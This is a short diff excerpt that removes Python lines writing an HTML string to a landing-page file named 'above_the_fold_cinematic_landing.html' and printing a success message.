-with open("above_the_fold_cinematic_landing.html", "w", encoding="utf-8") as f:
-    f.write(premium_optimized_html)
-
-print("Above-the-fold 3D layout optimized and written successfully.")
-
